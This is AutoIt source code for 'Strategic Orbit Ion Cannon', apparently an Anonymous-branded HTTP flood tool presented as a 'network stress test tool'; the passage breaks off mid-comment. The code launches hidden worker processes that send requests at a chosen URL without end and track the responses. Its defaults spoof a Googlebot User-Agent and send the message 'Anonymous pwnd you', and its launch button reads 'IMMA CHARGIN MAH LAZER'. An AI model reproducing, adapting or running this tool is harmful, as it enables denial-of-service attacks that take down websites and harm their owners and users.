#region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_icon=SOIC.ico
#AutoIt3Wrapper_UseX64=n
#AutoIt3Wrapper_Res_Comment=DownloadLink = https://github.com/Anonymous-Dev/Soic
#AutoIt3Wrapper_Res_Description=Network stress test tool
#AutoIt3Wrapper_Res_Fileversion=1.0.0.5
#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=p
#AutoIt3Wrapper_Res_LegalCopyright=© Anonymous Author Vlad
#AutoIt3Wrapper_AU3Check_Stop_OnWarning=y
#AutoIt3Wrapper_Run_Tidy=y
#endregion ;**** Directives created by AutoIt3Wrapper_GUI ****
#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
;
#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
;
#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
;
#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
;
$oMyError = ObjEvent("AutoIt.Error", "IgnoreErr") ; Ignore errors and resume script
;$oMyError = ObjEvent("AutoIt.Error", "MyErrFunc") ; Initialize a COM error handler
If $CmdLine[0] = 3 Then
	Opt("TrayIconHide", 1)
	Local $athread[16], $2xx, $3xx, $4xx, $5xx, $Failed, $TotKB, $oHTTP, $response0 = ""
	For $column = 0 To 15
		$athread[$column] = RegRead("HKCU\Software\soic", $CmdLine[1] & $column)
		If @error Then Exit
	Next
	; split headers to name/value pairs and place to array
	$aNameValue = StringSplit($athread[3], @CRLF, 1)
	$T0 = TimerInit()
	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
	With $oHTTP
		.SetProxy($athread[15], $athread[5], "") ; Use proxy_server for all domains. BypassList = ""
		.SetTimeouts($athread[10], $athread[11], $athread[12], $athread[13])
		;.SetClientCertificate("LOCAL_MACHINE\Personal\My Certificate")
	EndWith
	While 1
		With $oHTTP
			.Open($athread[1], $athread[0], True)
			;.SetAutoLogonPolicy(2) ; Always = 0, default OnlyIfBypassProxy = 1, Never = 2
			.SetCredentials($athread[6], $athread[7], 1) ; set credentials for proxy
			.SetCredentials($athread[8], $athread[9], 0) ; set credentials for server
			For $header = 1 To $aNameValue[0] - 1 Step 2
				If $aNameValue[$header] = "" Or $aNameValue[$header + 1] = "" Then ExitLoop
				.SetRequestHeader($aNameValue[$header], $aNameValue[$header + 1])
			Next
			.Send($athread[2])
			;.Abort
			.WaitForResponse($athread[14])
			;_ArrayDisplay($aListView)
			;$timeinit = TimerInit()
			;MsgBox(0, "Time Difference", $Pid)
			$response1 = .Responsetext
			$TotKB += BinaryLen(StringToBinary($response1)) / 1024
			If $CmdLine[3] = 1 And $response1 <> "" And TimerDiff($T0) > 1000 Then
				RegWrite("HKCU\Software\soic", "Response", "REG_MULTI_SZ", .StatusText & @CRLF & $response1)
				$response0 = $response1
			EndIf
			Switch .Status
				Case 200 To 299
					$2xx += 1
				Case 300 To 399
					$3xx += 1
				Case 400 To 499
					$4xx += 1
				Case 500 To 599
					$5xx += 1
				Case Else
					$Failed += 1
			EndSwitch
		EndWith
		If TimerDiff($T0) > 1000 Then
			RegWrite("HKCU\Software\soic", $CmdLine[1] & "Status" & $CmdLine[2], "REG_MULTI_SZ", $2xx & "|" & $3xx & "|" & $4xx & "|" & $5xx & "|" & $Failed & "|" & $TotKB)
			$T0 = TimerInit()
		EndIf
	WEnd
Else
	Opt("GUICloseOnESC", 0);turn off exit on esc.
	Opt("GUIOnEventMode", 1)
	Opt("MustDeclareVars", 0)
	Opt("TrayOnEventMode", 1)
	Opt("TrayMenuMode", 1)
	TrayCreateItem("Exit")
	TrayItemSetOnEvent(-1, "GuiClose")
	Global $DebugIt = 0 ; write some info to std out
	Global $Debug_CB = False
	Global $Debug_LV = False
	Global $Debug_SB = False
	Global Const $WM_MOVING = 0x0216
	Global Const $WM_CAPTURECHANGED = 0x0215
	Global Const $LBN_SELCHANGE = 1
	Global Const $LBN_DBLCLK = 2
	Global Const $LBN_SETFOCUS = 4
	Global Const $LBN_KILLFOCUS = 5
	Global Const $DTN_WMKEYDOWNA = -740 + 3 ; modify keydown on app format field (X) $DTN_FIRST = -740
	Global Const $GUILOSTFOCUS = -1
	Global $LVCALLBACK = "_CancelEdit" ; action on left click default to cancel edit
	Global $LVCONTEXT = "_CancelEdit" ; action on right click default to cancel edit
	Global $bCALLBACK = False ;a call-back has been executed.
	Global $bCALLBACK_EVENT = False
	Global $bLVUPDATEONFOCUSCHANGE = True ;save editing if another cell is clicked
	Global $bLVDBLCLICK = False;
	Global $bLVITEMCHECKED = True; Listview has checkboxes
	Global $bLVEDITONDBLCLICK = True ;Must dblclick to edit
	Global $bDATECHANGED = False;
	Global $bPROGRESSSHOWING = False;
	Global $bInitiated = False ; signal that edit controls initiated
	Global $LVCHECKEDCNT = 0;
	Global $old_col
	Global $__LISTVIEWCTRL = -999 ; holds Hwnd of ListView
	Global $Gui, $editFlag
	Global $bCanceled = False
	Global $editHwnd ;= the Hwnd of the editing control.
	Global $editCtrl ;= the CtrlId of the editing control.
	Global $lvControlGui, $lvInput, $lvInput1, $lvEdit, $lvCombo, $lvCombo1, $lvDate, $lvList, $Pid[1] = [@AutoItPID]
	Global $lvEditText[1][2] ; saves edit control text.
	Global $LVINFO[11]; client coordinates of currently selected ListView subitem.
	Global $_lv_ghLastWnd, $__ghSBLastWnd
	Global $__gaInProcess_WinAPI[64][2] = [[0, 0]]
	; #VARIABLES# ===================================================================================================================
	Global $_UDF_GlobalIDs_Used[16][55535 + 2 + 1] ; [index][0] = HWND, [index][1] = NEXT ID $_UDF_GlobalID_MAX_IDS = 55535 $_UDF_GlobalIDs_OFFSET = 2 $_UDF_GlobalID_MAX_WIN = 16
	; ===============================================================================================================================
	; #INTERNAL_USE_ONLY# ===========================================================================================================
	; Name...........: $tagMEMMAP
	; Description ...: Contains information about the memory
	; Fields ........: hProc - Handle to the external process
	;                  Size  - Size, in bytes, of the memory block allocated
	;                  Mem   - Pointer to the memory block
	; Author ........: Anonymous
	; Remarks .......:
	; ===============================================================================================================================
	Global Const $tagMEMMAP = "handle hProc;ulong_ptr Size;ptr Mem"
	; #STRUCTURE# ===================================================================================================================
	; Name...........: $tagTOKEN_PRIVILEGES
	; Description ...: Contains information about a set of privileges for an access token
	; Fields ........: Count      - Specifies the number of entries
	;                  LUID       - Specifies a LUID value
	;                  Attributes - Specifies attributes of the LUID
	; Author ........: Anonymous
	; Remarks .......:
	; ===============================================================================================================================
	Global Const $tagTOKEN_PRIVILEGES = "dword Count;int64 LUID;dword Attributes"
	; #STRUCTURE# ===================================================================================================================
	; Name...........: $tagPOINT
	; Description ...: Defines the x- and y- coordinates of a point
	; Fields ........: X - Specifies the x-coordinate of the point
	;                  Y - Specifies the y-coordinate of the point
	; Author ........: Anonymous
	; Remarks .......:
	; ===============================================================================================================================
	Global Const $tagPOINT = "long X;long Y"
	; #STRUCTURE# ===================================================================================================================
	; Name...........: $tagLVITEM
	; Description ...: Specifies or receives the attributes of a list-view item
	; Fields ........: Mask      - Set of flags that specify which members of this structure contain data to be set or which members
	;                  +are being requested. This member can have one or more of the following flags set:
	;                  |$LVIF_COLUMNS     - The Columns member is valid
	;                  |$LVIF_DI_SETITEM  - The operating system should store the requested list item information
	;                  |$LVIF_GROUPID     - The GroupID member is valid
	;                  |$LVIF_IMAGE       - The Image member is valid
	;                  |$LVIF_INDENT      - The Indent member is valid
	;                  |$LVIF_NORECOMPUTE - The control will not generate LVN_GETDISPINFO to retrieve text information
	;                  |$LVIF_PARAM       - The Param member is valid
	;                  |$LVIF_STATE       - The State member is valid
	;                  |$LVIF_TEXT        - The Text member is valid
	;                  Item      - Zero based index of the item to which this structure refers
	;                  SubItem   - One based index of the subitem to which this structure refers
	;                  State     - Indicates the item's state, state image, and overlay image
	;                  StateMask - Value specifying which bits of the state member will be retrieved or modified
	;                  Text      - Pointer to a string containing the item text
	;                  TextMax   - Number of bytes in the buffer pointed to by Text, including the string terminator
	;                  Image     - Index of the item's icon in the control's image list
	;                  Param     - Value specific to the item
	;                  Indent    - Number of image widths to indent the item
	;                  GroupID   - Identifier of the tile view group that receives the item
	;                  Columns   - Number of tile view columns to display for this item
	;                  pColumns  - Pointer to the array of column indices
	; Author ........: Anonymous
	; Remarks .......:
	; ===============================================================================================================================
	Global Const $tagLVITEM = "uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & _
			"int Indent;int GroupID;uint Columns;ptr pColumns"
	$Gui = GUICreate("Strategic Orbit Ion Cannon 1.0.0.5 Beta", 970, 460, 200, 125)
	GUISetOnEvent(-3, "GuiClose") ; $GUI_EVENT_CLOSE = -3
	$__LISTVIEWCTRL = GUICtrlCreateListView("TargetUrlIp|Method|PostData|HttpHeaders|Threads|ProxyIp:port|ProxyUserName|ProxyPassword|ServerUserName|" & _
			"ServerPassword|ResolveTimeout, ms|ConnectTimeout|SendTimeout|ReceiveTimeout|WaitForResponse, sec", 0, 64, 970, 150, 0x0008) ; $LVS_SHOWSELALWAYS = 0x0008
	GUICtrlSendMsg($__LISTVIEWCTRL, 0x1000 + 54, 0x00000001, 0x00000001) ; $LVM_SETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 54) $LVS_EX_GRIDLINES = 0x00000001
	GUICtrlSendMsg($__LISTVIEWCTRL, 0x1000 + 54, 0x00000004, 0x00000004) ; $LVM_SETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 54) $LVS_EX_CHECKBOXES = 0x00000004
	$Edit = GUICtrlCreateEdit("", 0, 215, 970, 223)
	$TimeBetweenThreads = GUICtrlCreateInput("0", 600, 20, 70, 20)
	GUICtrlSetStyle(-1, 8192) ; $ES_NUMBER = 8192
	GUICtrlCreateUpdown($TimeBetweenThreads, BitOR(0x0020, 0x0080)) ; $UDS_ARROWKEYS = 0x0020 $UDS_NOTHOUSANDS = 0x0080
	GUICtrlSetLimit(-1, 999999999999999, 0)
	GUICtrlCreateLabel("Thread spawn delay, ms", 530, 20, 70, 30)
	$CBresp = GUICtrlCreateCheckbox("Show Response", 700, 10)
	$CBreg = GUICtrlCreateCheckbox("Clear registry", 700, 30)
	GUICtrlSetState(-1, 1)
	$nColumnCount = _GUICtrlListView_GetColumnCount($__LISTVIEWCTRL)
	;array dim to number of cols, value of each element determines control.
	;0= ignore, 1= input, 2= combo, 4= calendar, 8 = list, 16 =combo1 , 32=updown , 64=edit , 256 use callback.
	Global $LVcolControl[$nColumnCount] = [1, 2, 64, 64, 32, 16, 1, 1, 1, 1, 32, 32, 32, 32, 32] ;left click actions
	;0= ignore, 256 = context callback.
	Global $LVcolRControl[$nColumnCount] = [256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256] ; right click actions
	_SetLvContext("ContextMenu") ;set context function
	$Button1 = GUICtrlCreateCheckbox("IMMA CHARGIN MAH LAZER", 800, 20, 161, 33, 0x1000) ; $BS_PUSHLIKE = 0x1000
	_InitEditLib("", "", "", "", "", "", $Gui)
	GUICtrlSetStyle($lvInput1, 8192) ; $ES_NUMBER = 8192
	$UpDown = GUICtrlCreateUpdown($lvInput1, BitOR(0x0020, 0x0080)) ; $UDS_ARROWKEYS = 0x0020 $UDS_NOTHOUSANDS = 0x0080
	GUICtrlSetLimit($UpDown, 999999999999999, -1)
	GUICtrlSetData($lvCombo, "GET|POST|PUT|HEAD|DELETE|OPTIONS|TRACE")
	GUICtrlSetTip($lvEdit, "Content-type HttpHeader specifies PostData format" & @CRLF & "HttpHeaders format:" & @CRLF & "[Header Name] without colon" & @CRLF & "[Header Value] on the next line")
	GUICtrlSetData($lvCombo1, "Proxycfg.exe/Netsh.exe winhttp settings")
	;Read ini file with saved settings
	Local $hFile = FileOpen(@ScriptName & ".ini", 0) ; $FO_READ = 0
	Local $sFile = FileRead($hFile, FileGetSize(@ScriptName & ".ini"))
	FileClose($hFile)
	; remove last line separator if any at the end of the file
	If StringRight($sFile, 1) = @LF Then $sFile = StringTrimRight($sFile, 1)
	If StringRight($sFile, 1) = @CR Then $sFile = StringTrimRight($sFile, 1)
	$aListViewColumns = StringSplit($sFile, "[$*-ColumnSplit-*$]" & @CRLF, 1)
	For $column = 1 To $aListViewColumns[0]
		; remove last line separator if any at the end of the sting
		If StringRight($aListViewColumns[$column], 1) = @LF Then $aListViewColumns[$column] = StringTrimRight($aListViewColumns[$column], 1)
		If StringRight($aListViewColumns[$column], 1) = @CR Then $aListViewColumns[$column] = StringTrimRight($aListViewColumns[$column], 1)
		Switch $column
			Case 4, 5 ; Post,HttpHeader columns
				$aListView = StringSplit($aListViewColumns[$column], @CRLF & "[$*-PostHeaderSplit-*$]" & @CRLF, 1)
				ReDim $lvEditText[$aListView[0]][2]
			Case Else
				If StringInStr($aListViewColumns[$column], @LF) Then
					$aListView = StringSplit(StringStripCR($aListViewColumns[$column]), @LF)
				ElseIf StringInStr($aListViewColumns[$column], @CR) Then ;; @LF does not exist so split on the @CR
					$aListView = StringSplit($aListViewColumns[$column], @CR)
				Else ;; unable to split the file, there is only one item or empty column
					Dim $aListView[2] = [0, 0]
					If StringLen($aListViewColumns[$column]) Then Dim $aListView[2] = [1, $aListViewColumns[$column]]
				EndIf
		EndSwitch
		For $item = 1 To $aListView[0]
			Switch $column
				Case 1
					GUICtrlCreateListViewItem("", $__LISTVIEWCTRL)
					If $aListView[$item] = "True" Then _GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $item - 1, True)
				Case Else
					_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $item - 1, $aListView[$item], $column - 2)
					If $column = 4 Or $column = 5 Then ;Post,HttpHeader columns
						$lvEditText[$item - 1][$column - 4] = $aListView[$item]

					EndIf
			EndSwitch
		Next
	Next
	$bInitiated = True
	GUISetState(@SW_SHOW, $Gui)

	While 1
		Sleep(10)
		_MonitorEditState($editCtrl, $editFlag, $__LISTVIEWCTRL, $LVINFO)
		If GUICtrlRead($Button1) = 1 Then ;  1 = $GUI_CHECKED
			$CheckedCount = _LvGetCheckedCount($__LISTVIEWCTRL)
			If $CheckedCount > 0 Then
				$StatusBar1 = _GUICtrlStatusBar_Create($Gui, -1, "Engaging...")
				RegDelete("HKCU\Software\soic")
				Save()
				Button1Click()
			EndIf
		EndIf
	WEnd
EndIf


_TermEditLib()
Exit



Func Button1Click()
	$nItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
	Local $aListView[1][$nColumnCount], $nCheckedItem = 0, $aHeaders[$CheckedCount][2], $oHTTP[$CheckedCount], $TotKB0 = 0, $Hits0 = 0
	For $item = 0 To $nItemCount - 1
		If _GUICtrlListView_GetItemChecked($__LISTVIEWCTRL, $item) Then
			$nCheckedItem += 1
			ReDim $aListView[$nCheckedItem][$nColumnCount + 1]
			For $column = 0 To $nColumnCount - 1
				$aListView[$nCheckedItem - 1][$column] = _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $item, $column)
				Switch $column
					Case 1
						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = "GET" ; default method if none specified
					Case 2
						RegWrite("HKCU\Software\soic", $nCheckedItem & $column, "REG_MULTI_SZ", $lvEditText[$item][0])
						ContinueLoop
					Case 3 ; split headers to name/value pairs and place to array
						$aNameValue = StringSplit($lvEditText[$nCheckedItem - 1][1], @CRLF, 1)
						If $aNameValue[0] > UBound($aHeaders, 2) Then ReDim $aHeaders[$CheckedCount][$aNameValue[0]]
						For $NameValue = 0 To $aNameValue[0] - 1
							$aHeaders[$nCheckedItem - 1][$NameValue] = $aNameValue[$NameValue + 1]
						Next
					Case 4
					Case 5
						Switch $aListView[$nCheckedItem - 1][$column]
							Case ""
								$aListView[$nCheckedItem - 1][$nColumnCount] = 1 ; direct connection
							Case "Proxycfg.exe/Netsh.exe winhttp settings"
								$aListView[$nCheckedItem - 1][$nColumnCount] = 0 ; use proxy WinHttpSettings from registry
							Case Else
								$aListView[$nCheckedItem - 1][$nColumnCount] = 2 ; use specified proxy
						EndSwitch
						RegWrite("HKCU\Software\soic", $nCheckedItem & "15", "REG_MULTI_SZ", $aListView[$nCheckedItem - 1][15])
					Case 6
						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = " " ; default proxyUserName
					Case 7
						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = " " ; default proxyPass
					Case 8
						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = " " ; default serverUserName
					Case 9
						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = " " ; default serverPass
					Case 10
						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 60000 ; default resolve timout
					Case 11
						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 60000 ; default connect timeout
					Case 12
						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 30000 ; default send timeout
					Case 13
						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 30000 ; default receive timeout
				EndSwitch
				RegWrite("HKCU\Software\soic", $nCheckedItem & $column, "REG_MULTI_SZ", $aListView[$nCheckedItem - 1][$column])
			Next
			$UBpid = UBound($Pid)
			ReDim $Pid[$UBpid + $aListView[$nCheckedItem - 1][4]]
			For $thread = 1 To $aListView[$nCheckedItem - 1][4]
				$Pid[$UBpid + $thread - 1] = Run(@ScriptName & " " & $nCheckedItem & " " & $thread & " " & GUICtrlRead($CBresp), @SystemDir, @SW_HIDE, 0x1)
				Sleep(GUICtrlRead($TimeBetweenThreads))
			Next
		EndIf
	Next

	While 1
		$T0 = TimerInit()
		Sleep(1000)
		_MonitorEditState($editCtrl, $editFlag, $__LISTVIEWCTRL, $LVINFO)
		If GUICtrlRead($Button1) <> 1 Then
			For $i = 1 To UBound($Pid) - 1
				ProcessClose($Pid[$i])
			Next
			ExitLoop
		EndIf
		If GUICtrlRead($CBresp) = 1 Then GUICtrlSetData($Edit, RegRead("HKCU\Software\soic", "Response"))
		Local $2xx = 0, $3xx = 0, $4xx = 0, $5xx = 0, $Failed = 0, $TotKB1 = 0
		For $item = 1 To $nCheckedItem
			For $thread = 1 To $aListView[$item - 1][4]
				$aStatus = StringSplit(RegRead("HKCU\Software\soic", $item & "Status" & $thread), "|")
				If @error Then ExitLoop 1
				$2xx += $aStatus[1]
				$3xx += $aStatus[2]
				$4xx += $aStatus[3]
				$5xx += $aStatus[4]
				$Failed += $aStatus[5]
				$TotKB1 += $aStatus[6]
			Next
		Next
		$Hits1 = $2xx + $3xx + $4xx + $5xx
		$statMsg1 = StringFormat("2xx: %u  3xx: %u  4xx: %u  5xx: %u  Fail: %u  Received, KB: %u  KB/s: %.1f  Hit/s: %.1f", $2xx, $3xx, $4xx, $5xx, $Failed, $TotKB1, $TotKB1 - $TotKB0, $Hits1 - $Hits0)
		_GUICtrlStatusBar_SetText($StatusBar1, $statMsg1)
		$TotKB0 = $TotKB1
		$Hits0 = $Hits1
	WEnd
EndFunc   ;==>Button1Click

Func GuiClose()
	Save()
	If GUICtrlRead($CBreg) = 1 Then RegDelete("HKCU\Software\soic")
	For $i = 1 To UBound($Pid) - 1
		ProcessClose($Pid[$i])
	Next
	_TermEditLib()
	Exit
EndFunc   ;==>GuiClose

Func Save()
	$nItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
	;Save settings to ini file
	$hFile = FileOpen(@ScriptName & ".ini", 2) ; $FO_OVERWRITE = 2
	For $column = -1 To $nColumnCount - 1
		For $item = 0 To $nItemCount - 1
			Switch $column
				Case -1
					FileWrite($hFile, _GUICtrlListView_GetItemChecked($__LISTVIEWCTRL, $item) & @CRLF)
				Case 2, 3
					FileWrite($hFile, $lvEditText[$item][$column - 2] & @CRLF)
					If $item = $nItemCount - 1 Then ExitLoop
					FileWrite($hFile, "[$*-PostHeaderSplit-*$]" & @CRLF)
				Case Else
					FileWrite($hFile, _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $item, $column) & @CRLF)
			EndSwitch
		Next
		If $column = $nColumnCount - 1 Then ExitLoop
		FileWrite($hFile, "[$*-ColumnSplit-*$]" & @CRLF)
	Next
	FileClose(@ScriptName & ".ini")
EndFunc   ;==>Save

Func ContextMenu($aLVInfo)
	;create context menu on demand.
	;----------------------------------------------------------------------------------------------
	If $DebugIt Then ConsoleWrite(_DebugHeader(StringFormat("MyContext Row:%d Col:%d", $aLVInfo[0], $aLVInfo[1])))
	;----------------------------------------------------------------------------------------------
	Local $HelpCtx[11]
	$HelpCtx[0] = GUICtrlCreateDummy()
	$HelpCtx[1] = GUICtrlCreateContextMenu($HelpCtx[0])
	$HelpCtx[2] = GUICtrlCreateMenuItem("Add Item", $HelpCtx[1])
	$HelpCtx[3] = GUICtrlCreateMenuItem("", $HelpCtx[1])
	$HelpCtx[4] = GUICtrlCreateMenuItem("Delete Item", $HelpCtx[1])
	$HelpCtx[5] = GUICtrlCreateMenuItem("", $HelpCtx[1])
	$HelpCtx[6] = GUICtrlCreateMenuItem("Check Item", $HelpCtx[1])
	$HelpCtx[7] = GUICtrlCreateMenuItem("", $HelpCtx[1])
	$HelpCtx[8] = GUICtrlCreateMenuItem("Uncheck Item", $HelpCtx[1])
	$HelpCtx[9] = GUICtrlCreateMenuItem("", $HelpCtx[1])
	$HelpCtx[10] = GUICtrlCreateMenuItem("Copy Item", $HelpCtx[1])
	GUISetState(@SW_SHOW)
	Local $ctx = _GUICtrlMenu_TrackPopupMenu(GUICtrlGetHandle($HelpCtx[1]), WinGetHandle($Gui), -1, -1, 2, 2, 2)
	;----------------------------------------------------------------------------------------------
	If $DebugIt Then ConsoleWrite(_DebugHeader("MenuItem=" & $ctx))
	;----------------------------------------------------------------------------------------------
	Switch $ctx
		Case $HelpCtx[2]
			GUICtrlCreateListViewItem("http://|GET|Anonymous pwnd you|User-Agent" & @CRLF & "Googlebot/2.1 (+http://www.google.com/bot.html)" _
					 & @CRLF & "Accept-Encoding" & @CRLF & "gzip" & @CRLF & "Connection" & @CRLF & "keep-alive" & @CRLF & "Content-type" & @CRLF & "text/html|10||||||60000|60000|30000|30000|0", $__LISTVIEWCTRL)
			Local $ItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
			If $ItemCount = 1 Then Global $lvEditText[1][2]
			ReDim $lvEditText[$ItemCount][2]
			$lvEditText[$ItemCount - 1][0] = "Anonymous pwnd you"
			$lvEditText[$ItemCount - 1][1] = "User-Agent" & @CRLF & "Googlebot/2.1 (+http://www.google.com/bot.html)" & @CRLF & "Accept-Encoding" & @CRLF & "gzip" _
					 & @CRLF & "Connection" & @CRLF & "keep-alive" & @CRLF & "Content-type" & @CRLF & "text/html"
		Case $HelpCtx[4]
			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
			For $i = $items[0] To 1 Step -1
				_GUICtrlListView_DeleteItem($__LISTVIEWCTRL, $items[$i])
				_ArrayDelete($lvEditText, $items[$i])
			Next
		Case $HelpCtx[6]
			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
			For $i = $items[0] To 1 Step -1
				_GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $items[$i], True)
			Next
		Case $HelpCtx[8]
			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
			For $i = $items[0] To 1 Step -1
				_GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $items[$i], False)
			Next
		Case $HelpCtx[10]
			Local $items = _GUICtrlListView_GetSelectedIndices($__LISTVIEWCTRL, 1)
			For $i = $items[0] To 1 Step -1
				GUICtrlCreateListViewItem("", $__LISTVIEWCTRL)
				Local $ItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
				_GUICtrlListView_SetItemChecked($__LISTVIEWCTRL, $ItemCount - 1, _GUICtrlListView_GetItemChecked($__LISTVIEWCTRL, $items[$i]))
				ReDim $lvEditText[$ItemCount][2]
				$lvEditText[$ItemCount - 1][0] = $lvEditText[$items[$i]][0]
				$lvEditText[$ItemCount - 1][1] = $lvEditText[$items[$i]][1]
				For $column = 0 To $nColumnCount - 1
					_GUICtrlListView_SetItemText($__LISTVIEWCTRL, $ItemCount - 1, _GUICtrlListView_GetItemText($__LISTVIEWCTRL, $items[$i], $column), $column)
				Next
			Next
	EndSwitch
EndFunc   ;==>ContextMenu

;just a dummy function to ignore errors
Func IgnoreErr()
	Sleep(1)
EndFunc   ;==>IgnoreErr

#CS
	; COM Error Handler
	; -------------------------
	; This is custom defined error handler
	Func MyErrFunc()
	MsgBox(0, "winhttp error", "We intercepted a COM Error !" & @CRLF & @CRLF & _
	"err.description is: " & @TAB & $oMyError.description & @CRLF & _
	"err.windescription:" & @TAB & $oMyError.windescription & @CRLF & _
	"err.number is: " & @TAB & Hex($oMyError.number, 8) & @CRLF & _
	"err.lastdllerror is: " & @TAB & $oMyError.lastdllerror & @CRLF & _
	"err.scriptline is: " & @TAB & $oMyError.scriptline & @CRLF & _
	"err.source is: " & @TAB & $oMyError.source & @CRLF & _
	"err.helpfile is: " & @TAB & $oMyError.helpfile & @CRLF & _
	"err.helpcontext is: " & @TAB & $oMyError.helpcontext _
	, 10)
	EndFunc   ;==>MyErrFunc
#CE

;===============================================================================
; Function Name:	_InitEditLib
; Description:		Create the editing controls and registers WM_NOTIFY handler.
; Parameter(s):
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):		Call this BEFORE you create your listview.
;===============================================================================
Func _InitEditLib($lvInputStart = "", $lvInput1Start = "", $lvEditStart = "", $lvComboStart = "", $lvCombo1Start = "", $lvDataStart = "", $lvListStart = "", $hParent = 0)
	_TermEditLib()
	$lvControlGui = GUICreate("LVCONTROL", 0, 0, 1, 1, 0x80000000, -1, $hParent) ; $WS_POPUP = 0x80000000
	$lvInput = GUICtrlCreateInput($lvInputStart, 0, 0, 1, 1, BitOR(128, 256, 0x00800000), 0) ; $WS_BORDER = 0x00800000 $ES_AUTOHSCROLL = 128 $ES_NOHIDESEL = 256
	GUICtrlSetState($lvInput, 32) ; 32 = $GUI_HIDE
	GUICtrlSetFont($lvInput, 8.5)
	$lvInput1 = GUICtrlCreateInput($lvInput1Start, 0, 0, 1, 1)
	GUICtrlSetState($lvInput1, 32) ; 32 = $GUI_HIDE
	$lvEdit = GUICtrlCreateEdit($lvEditStart, 0, 0, 1, 1)
	GUICtrlSetState($lvEdit, 32) ;32 = $GUI_HIDE
	$lvCombo = GUICtrlCreateCombo($lvComboStart, 0, 0, 1, 1, -1, 0x00000008) ; $WS_EX_TOPMOST = 0x00000008
	GUICtrlSetState($lvCombo, 32) ; 32 = $GUI_HIDE
	$lvCombo1 = GUICtrlCreateCombo($lvCombo1Start, 0, 0, 1, 1, -1, 0x00000008) ; $WS_EX_TOPMOST = 0x00000008
	GUICtrlSetState($lvCombo1, 32) ; 32 = $GUI_HIDE
	$lvDate = GUICtrlCreateDate($lvDataStart, 0, 0, 1, 1, BitOR(4, 0), BitOR(0x00000200, 0x00000008)) ; $WS_EX_CLIENTEDGE = 0x00000200 $WS_EX_TOPMOST = 0x00000008 $GUI_SS_DEFAULT_DATE = 4 $DTS_SHORTDATEFORMAT = 0
	GUICtrlSetState($lvDate, 32) ; 32 = $GUI_HIDE
	$lvList = GUICtrlCreateList($lvListStart, 0, 0, 1, 1, -1, 0x00000008) ; $WS_EX_TOPMOST = 0x00000008
	GUICtrlSetState($lvList, 32) ; 32 = $GUI_HIDE
	GUISetState(@SW_HIDE, $lvControlGui)
	GUIRegisterMsg(0x0006, "WM_ACTIVATE") ; $WM_ACTIVATE = 0x0006
	GUIRegisterMsg(0x0003, "WM_MOVE_EVENT") ; $WM_MOVE = 0x0003
	GUIRegisterMsg($WM_MOVING, "WM_Notify_Events")
	GUIRegisterMsg(0x004E, "WM_Notify_Events") ; $WM_NOTIFY = 0x004E
	GUIRegisterMsg(0x0111, "WM_Command_Events") ; $WM_COMMAND = 0x0111
EndFunc   ;==>_InitEditLib
;===============================================================================
; Function Name:	_TermEditLib
; Description:		Deletes the editing controls and un-registers WM_NOTIFY handler.
; Parameter(s):
; Requirement(s):
; Return Value(s):
; User CallTip:
; Author(s):
; Note(s):		Call this when close your gui if switching to another gui.
;===============================================================================
Func _TermEditLib()
	GUICtrlDelete($lvInput)
	GUICtrlDelete($lvInput1)
	GUICtrlDelete($lvEdit)
	GUICtrlDelete($lvCombo)
	GUICtrlDelete($lvCombo1)
	GUICtrlDelete($lvDate)
	GUICtrlDelete($lvList)
	GUIRegisterMsg(0x0006, "") ; $WM_ACTIVATE = 0x0006
	GUIRegisterMsg(0x0003, "") ; $WM_MOVE = 0x0003
	GUIRegisterMsg($WM_MOVING, "")
	GUIRegisterMsg(0x004E, "") ; $WM_NOTIFY = 0x004E
	GUIRegisterMsg(0x0111, "") ; $WM_COMMAND = 0x0111
EndFunc   ;==>_TermEditLib
;===============================================================================
; Function Name:	ListView_Click
; Description:	Called from WN_NOTIFY event handler.
; Parameter(s):
